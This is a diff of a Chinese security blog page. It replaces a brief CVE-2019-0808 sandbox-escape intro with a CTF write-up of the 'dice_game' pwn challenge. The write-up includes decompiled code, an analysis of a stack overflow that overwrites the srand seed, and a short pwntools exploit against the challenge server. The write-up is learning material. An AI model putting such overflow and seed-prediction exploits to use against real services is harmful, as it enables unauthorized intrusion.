@@ -3,20 +3,23 @@
 <head>
   <meta charset="utf-8">
   
-  <title>CVE-2019-0808 | Sinky-wang</title>
+  <title>攻防世界-dice_game | Sinky-wang</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Chrome基于多进程架构，主要包括浏览器进程和渲染进程，进程间通过IPC通信（Mojo），其中渲染进程运行着不可信的HTML和JS代码。浏览器中的每一个tab为一个独立的进程，运行在Untruster的低权限等级，并通过沙箱引擎隔离。因此像CVE-2019-5768这样的渲染进程中的远程代码执行漏洞仍需要结合其他高权限漏洞实现沙箱逃逸。  利用浏览器进程的漏洞，比如IndexedDB,Mojo等">
+  <meta name="description" content="0x01 Checkseclinux下checksec查壳，开启了relro nx pie防护：  0x02 分析IDA打开，主函数： 123456789101112131415161718192021222324252627282930313233343536373839__int64 __fastcall main(__int64 a1, char **a2, char **a3)&amp;#123;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2019-0808">
-<meta property="og:url" content="https://sinky-wang.github.io/2020/07/14/CVE-2019-0808/index.html">
+<meta property="og:title" content="攻防世界-dice_game">
+<meta property="og:url" content="https://sinky-wang.github.io/2020/07/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/index.html">
 <meta property="og:site_name" content="Sinky-wang">
-<meta property="og:description" content="Chrome基于多进程架构，主要包括浏览器进程和渲染进程，进程间通过IPC通信（Mojo），其中渲染进程运行着不可信的HTML和JS代码。浏览器中的每一个tab为一个独立的进程，运行在Untruster的低权限等级，并通过沙箱引擎隔离。因此像CVE-2019-5768这样的渲染进程中的远程代码执行漏洞仍需要结合其他高权限漏洞实现沙箱逃逸。  利用浏览器进程的漏洞，比如IndexedDB,Mojo等">
+<meta property="og:description" content="0x01 Checkseclinux下checksec查壳，开启了relro nx pie防护：  0x02 分析IDA打开，主函数： 123456789101112131415161718192021222324252627282930313233343536373839__int64 __fastcall main(__int64 a1, char **a2, char **a3)&amp;#123;">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-07-14T03:38:52.959Z">
-<meta property="article:modified_time" content="2020-07-14T05:12:12.618Z">
+<meta property="og:image" content="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png">
+<meta property="article:published_time" content="2020-07-22T09:49:56.548Z">
+<meta property="article:modified_time" content="2020-07-23T04:01:42.041Z">
 <meta property="article:author" content="Sinky-wang">
-<meta property="article:tag" content="chrome_bug">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png">
   
     <link rel="alternative" href="/atom.xml" title="Sinky-wang" type="application/atom+xml">
   
@@ -289,11 +292,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-CVE-2019-0808" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-攻防世界-pwn-dice_game" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/07/14/CVE-2019-0808/" class="article-date">
-      <time datetime="2020-07-14T03:38:52.959Z" itemprop="datePublished">2020-07-14</time>
+      <a href="/2020/07/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/" class="article-date">
+      <time datetime="2020-07-22T09:49:56.548Z" itemprop="datePublished">2020-07-22</time>
 </a>
     </div>
   
@@ -306,7 +309,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      CVE-2019-0808
+      攻防世界-dice_game
     </h1>
   
 
@@ -317,7 +320,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome-bug/" rel="tag">chrome_bug</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -327,14 +330,17 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>Chrome基于多进程架构，主要包括浏览器进程和渲染进程，进程间通过IPC通信（Mojo），其中渲染进程运行着不可信的HTML和JS代码。浏览器中的每一个tab为一个独立的进程，运行在Untruster的低权限等级，并通过沙箱引擎隔离。因此像CVE-2019-5768这样的渲染进程中的远程代码执行漏洞仍需要结合其他高权限漏洞实现沙箱逃逸。</p>
-<ul>
-<li>利用浏览器进程的漏洞，比如IndexedDB,Mojo等</li>
-<li>利用操作系统内核漏洞，比如与CVE-2019-5768组合的win32k.sys内核提权漏洞CVE-2019-0808</li>
-</ul>
-<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>CVE-2019-0808是win32k.sys中的一个空指针解引用漏洞，根据360Blog,漏洞存在于win32k!xxxMNMouseMove函数中：</p>
-<p>首先分析xxxMNMouseMove函数：</p>
+        <h2 id="0x01-Checksec"><a href="#0x01-Checksec" class="headerlink" title="0x01 Checksec"></a>0x01 Checksec</h2><p>linux下checksec查壳，开启了relro nx pie防护：</p>
+<p><img src="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png" alt="pwn-checksec.PNG"></p>
+<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>IDA打开，主函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[55]; &#x2F;&#x2F; [rsp+0h] [rbp-50h]</span><br><span class="line">  char v5; &#x2F;&#x2F; [rsp+37h] [rbp-19h]</span><br><span class="line">  ssize_t v6; &#x2F;&#x2F; [rsp+38h] [rbp-18h]</span><br><span class="line">  unsigned int seed[2]; &#x2F;&#x2F; [rsp+40h] [rbp-10h]</span><br><span class="line">  unsigned int v8; &#x2F;&#x2F; [rsp+4Ch] [rbp-4h]</span><br><span class="line">  memset(buf, 0, 0x30uLL);</span><br><span class="line">  *(_QWORD *)seed &#x3D; time(0LL);</span><br><span class="line">  printf(&quot;Welcome, let me know your name: &quot;, a2);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  v6 &#x3D; read(0, buf, 0x50uLL);</span><br><span class="line">  if ( v6 &lt;&#x3D; 49 )</span><br><span class="line">    buf[v6 - 1] &#x3D; 0;</span><br><span class="line">  printf(&quot;Hi, %s. Let&#39;s play a game.\n&quot;, buf);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  srand(seed[0]);</span><br><span class="line">  v8 &#x3D; 1;</span><br><span class="line">  v5 &#x3D; 0;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Game %d&#x2F;50\n&quot;, v8);</span><br><span class="line">    v5 &#x3D; sub_A20();</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    if ( v5 !&#x3D; 1 )</span><br><span class="line">      break;</span><br><span class="line">    if ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v8 &#x3D;&#x3D; 50 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_B28(buf);</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Bye bye!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p>是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_B28(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+10h] [rbp-70h]</span><br><span class="line">  FILE *stream; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line">  printf(&quot;Congrats %s\n&quot;, a1);</span><br><span class="line">  stream &#x3D; fopen(&quot;flag&quot;, &quot;r&quot;);</span><br><span class="line">  fgets(&amp;s, 100, stream);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  return fflush(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。</p>
+<p><img src="https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png" alt="相差40.PNG"></p>
+<p>随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉</p>
+<h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">p&#x3D;remote(&#39;220.249.52.133&#39;,34691)</span><br><span class="line">libc&#x3D;cdll.LoadLibrary(&quot;libc.so.6&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">payload&#x3D;0x40*&#39;a&#39;+p64(0)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">a&#x3D;[]</span><br><span class="line">for i in range(50):</span><br><span class="line">    a.append(libc.rand()%6+1)</span><br><span class="line">print(a)</span><br><span class="line">for i in a:</span><br><span class="line">    p.recv()</span><br><span class="line">    print(p.recv())</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
       
       
         <div class="page-reward">
@@ -389,13 +395,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2020/07/14/CVE-2019-0808/">CVE-2019-0808</a></p>
+        <p><span>本文标题:</span><a href="/2020/07/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/">攻防世界-dice_game</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Sinky-wang 的个人博客">Sinky-wang</a></p>
-        <p><span>发布时间:</span>2020年07月14日 - 11时38分</p>
-        <p><span>最后更新:</span>2020年07月14日 - 13时12分</p>
+        <p><span>发布时间:</span>2020年07月22日 - 17时49分</p>
+        <p><span>最后更新:</span>2020年07月23日 - 12时01分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2020/07/14/CVE-2019-0808/" title="CVE-2019-0808">https://sinky-wang.github.io/2020/07/14/CVE-2019-0808/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://sinky-wang.github.io/2020/07/14/CVE-2019-0808/　　作者: Sinky-wang" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2020/07/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/" title="攻防世界-dice_game">https://sinky-wang.github.io/2020/07/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://sinky-wang.github.io/2020/07/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/　　作者: Sinky-wang" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -408,18 +414,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2020/07/14/Chrome%E8%B0%83%E8%AF%95%20CVE-2019-5768/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          Chrome调试篇1 CVE-2019-5768
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/07/13/CVE-2019-0708/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CVE-2019-0708</div>
+    <a href="/2020/07/20/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9ACVE-2010-2883/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">漏洞战争学习笔记1：CVE-2010-2883</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -430,7 +427,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理分析"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理分析</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Checksec"><span class="toc-number">1.</span> <span class="toc-text">0x01 Checksec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-分析"><span class="toc-number">2.</span> <span class="toc-text">0x02 分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-exp"><span class="toc-number">3.</span> <span class="toc-text">0x03 exp</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -499,13 +496,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2020/07/14/Chrome%E8%B0%83%E8%AF%95%20CVE-2019-5768/" title="上一篇: Chrome调试篇1 CVE-2019-5768">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2020/07/13/CVE-2019-0708/" title="下一篇: CVE-2019-0708">
+            <a href="/2020/07/20/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9ACVE-2010-2883/" title="下一篇: 漏洞战争学习笔记1：CVE-2010-2883">
                 <i class="fa fa-angle-right"></i>
             </a>
         
